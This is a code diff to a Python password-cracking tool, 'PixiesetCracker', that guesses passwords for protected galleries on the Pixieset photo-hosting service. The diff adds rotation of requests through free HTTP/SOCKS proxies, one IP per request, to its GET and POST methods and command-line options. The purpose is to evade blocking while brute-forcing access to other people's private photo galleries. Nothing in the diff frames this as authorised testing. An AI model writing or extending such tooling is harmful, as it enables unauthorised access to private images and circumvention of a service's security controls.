@@ -184,6 +184,8 @@ class PixiesetCracker:
         delay: float = DELAY_BETWEEN_ATTEMPTS,
         browser_mode: bool = False,
         verbose: bool = False,
+        use_proxy: bool = False,
+        proxy_file: Optional[str] = None,
     ):
         self.base_url = base_url.rstrip("/")
         if not self.base_url.startswith("http"):
@@ -191,6 +193,14 @@ class PixiesetCracker:
         self.delay = delay
         self.browser_mode = browser_mode
         self.verbose = verbose
+        self.use_proxy = use_proxy
+        self._rotator = None
+
+        if use_proxy:
+            from proxy_rotator import ProxyRotator
+            self._rotator = ProxyRotator(pool_size=10, proxy_file=proxy_file)
+            self._rotator.fill_pool(5)
+
         self.session = cffi_requests.Session()
         self.session.headers.update({
             "User-Agent": USER_AGENT,
@@ -203,25 +213,31 @@ class PixiesetCracker:
     # ------------------------------------------------------------------
     def _get(self, path: str) -> cffi_requests.Response:
         url = urljoin(self.base_url, path)
+        proxy = self._rotator.get_dict() if self._rotator else None
         if self.verbose:
-            print(f"  {C.B}[GET]{C.W} {url}")
+            proxy_tag = f" via {list(proxy.values())[0]}" if proxy else ""
+            print(f"  {C.B}[GET]{C.W} {url}{proxy_tag}")
         return self.session.get(
             url,
             impersonate=IMPERSONATE,
             timeout=TIMEOUT,
             allow_redirects=True,
+            proxies=proxy,
         )
 
     def _post(self, path: str, data: dict) -> cffi_requests.Response:
         url = urljoin(self.base_url, path)
+        proxy = self._rotator.get_dict() if self._rotator else None
         if self.verbose:
-            print(f"  {C.B}[POST]{C.W} {url}  data={data}")
+            proxy_tag = f" via {list(proxy.values())[0]}" if proxy else ""
+            print(f"  {C.B}[POST]{C.W} {url}  data={data}{proxy_tag}")
         return self.session.post(
             url,
             data=data,
             impersonate=IMPERSONATE,
             timeout=TIMEOUT,
             allow_redirects=True,
+            proxies=proxy,
         )
 
     # ------------------------------------------------------------------
@@ -661,6 +677,8 @@ Examples:
   %(prog)s -u sub.pixieset.com -g jill,wedding -w wordlist.txt
   %(prog)s -u sub.pixieset.com --discover -f slugs.txt -w wordlist.txt
   %(prog)s -u sub.pixieset.com -g jill --browser
+  %(prog)s -u sub.pixieset.com -g jill --proxy
+  %(prog)s -u sub.pixieset.com -g jill --proxy --proxy-file proxies.json
   %(prog)s -u sub.pixieset.com -g jill --extra-words love,family,wedding
         """,
     )
@@ -681,6 +699,10 @@ Examples:
                         help="Discover password-protected galleries from a slug list")
     parser.add_argument("--browser", action="store_true",
                         help="Use agent-browser for full JS-capable testing (slower but bypasses all protections)")
+    parser.add_argument("--proxy", action="store_true",
+                        help="Rotate requests through free HTTP/SOCKS proxies (different IP per request)")
+    parser.add_argument("--proxy-file",
+                        help="Pre-validated proxy JSON file (skip fresh fetching)")
     parser.add_argument("--no-auto", action="store_true",
                         help="Disable automatic password generation from slug")
     parser.add_argument("-o", "--output", default="pixieset_results.json",
@@ -725,6 +747,8 @@ Examples:
         delay=args.delay,
         browser_mode=args.browser,
         verbose=args.verbose,
+        use_proxy=args.proxy,
+        proxy_file=args.proxy_file,
     )
 
     try:
